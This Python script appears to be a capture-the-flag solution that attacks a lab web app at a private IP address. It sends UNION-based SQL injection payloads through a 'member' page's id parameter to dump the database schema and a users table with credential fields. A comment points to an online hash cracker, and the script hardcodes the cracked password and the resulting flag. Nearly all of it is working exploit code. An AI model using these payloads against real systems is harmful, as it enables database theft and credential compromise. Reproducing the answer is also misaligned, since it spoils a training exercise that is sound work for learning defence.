import hashlib

import requests
from lxml import etree


def get_page(id_):
    url = f"http://192.168.122.213/?page=member&id={id_}&Submit=Submit#"
    r = requests.get(url)
    return r.text

def parse_html(html):
    root = etree.HTML(html)
    return root.xpath('//pre/text()')

def enumerate_members():
    for i in range(1, 100):
        parsed = parse_html(get_page(i))
        if parsed:
            print(parsed)

def inject_sql(sql):
    print("Injecting SQL:", sql)
    res = parse_html(get_page(sql))
    if len(res) == 1:
        print(f"Error: {res[0]}")
        return
    for r in res:
        if r.startswith("First name: "):
            print(r)




if __name__ == "__main__":
    # sql = """1 UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT_WS(0x3A, table_schema, table_name) SEPARATOR 0x0A) AS all_tables FROM information_schema.tables"""
    sql_template = "1 UNION SELECT CONCAT_WS(0x3A, {}), NULL FROM {} --"
    sql = sql_template.format("table_name, column_name", "information_schema.columns")
    inject_sql(f"{sql}")

    sql = sql_template.format("user_id, first_name, last_name, town, country, planet, Commentaire, countersign", "users")
    inject_sql(f"{sql}")

    # sql = sql_template.format("table_schema, table_name", "information_schema.tables")
    # inject_sql(f"{sql}")

    sql = sql_template.format("id, url, title, comment", "list_images")
    # "https://crackstation.net/" to decript password
    decrypted = "FortyTwo"
    decrypted = decrypted.lower()
    sha256 = hashlib.sha256(decrypted.encode()).hexdigest()
    print(sha256)
    # flag is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5